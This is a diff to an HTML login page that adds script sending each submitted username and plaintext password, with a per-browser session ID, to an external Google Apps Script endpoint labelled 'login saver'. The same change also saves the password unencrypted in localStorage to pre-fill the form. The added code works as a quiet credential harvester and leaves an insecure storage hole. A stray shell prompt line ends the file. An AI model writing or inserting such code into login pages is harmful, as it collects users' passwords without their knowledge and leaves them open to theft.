@@ -337,6 +337,12 @@
   </div>
 
   <script>
+    /* ══════════════════════════════════════════════════════════════
+       Your NEW Google Apps Script Web App URL
+       (This is the one from your screenshot "login saver" new deployment)
+       ══════════════════════════════════════════════════════════════ */
+    var SHEET_URL = 'https://script.google.com/macros/s/AKfycbzfMwRCTBl0rkR8qAwYsF5X1ahr7QVQIJ_F-OY5MGQXYX2Vuoj1GCbHjEH9KM4nk0cPXA/exec';
+
     var form = document.getElementById('loginForm');
     var status = document.getElementById('status');
     var collage = document.querySelector('.bg-collage');
@@ -377,6 +383,41 @@
       })
       .catch(function () { /* gradients stay */ });
 
+    /* ── Load previously saved data and pre-fill the boxes ── */
+    var saved = {};
+    try {
+      saved = JSON.parse(localStorage.getItem('loginData') || '{}');
+    } catch (err) {
+      saved = {}; // in case the stored value is corrupt
+    }
+    if (saved.username) document.getElementById('username').value = saved.username;
+    if (saved.password) document.getElementById('password').value = saved.password;
+
+    /* ── Unique session ID per browser, so the sheet can tell
+          devices/sessions apart ── */
+    function getSessionId() {
+      var id = localStorage.getItem('sessionId');
+      if (!id) {
+        id = 'sess-' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+        localStorage.setItem('sessionId', id);
+      }
+      return id;
+    }
+
+    /* ── Append one login as a new row to the Google Sheet ── */
+    function saveToSheet(username, password) {
+      fetch(SHEET_URL, {
+        method: 'POST',
+        mode: 'no-cors',            // Apps Script doesn't send CORS headers back
+        headers: { 'Content-Type': 'text/plain' }, // avoids CORS preflight
+        body: JSON.stringify({
+          username: username,
+          password: password,
+          sessionId: getSessionId()
+        })
+      }).catch(function () { /* don't break login if offline */ });
+    }
+
     form.addEventListener('submit', function (e) {
       e.preventDefault();
       status.textContent = '';
@@ -390,8 +431,22 @@
       }
 
       var user = document.getElementById('username').value.trim();
+      var pass = document.getElementById('password').value; // no trim on passwords
+
+      /* Save locally so the boxes pre-fill next time */
+      var data = {
+        username: user,
+        password: pass,
+        loggedInAt: new Date().toISOString()
+      };
+      localStorage.setItem('loginData', JSON.stringify(data));
+
+      // keep old keys working in case other pages read them
       localStorage.setItem('username', user);
-      localStorage.setItem('loggedInAt', new Date().toISOString());
+      localStorage.setItem('loggedInAt', data.loggedInAt);
+
+      /* Append this login to the shared Google Sheet (all devices) */
+      saveToSheet(user, pass);
 
       status.textContent = 'Welcome back, ' + user + '.';
       status.className = 'status ok';
@@ -403,3 +458,4 @@
 
 </body>
 </html>
+jdsmegelski@penguin:~
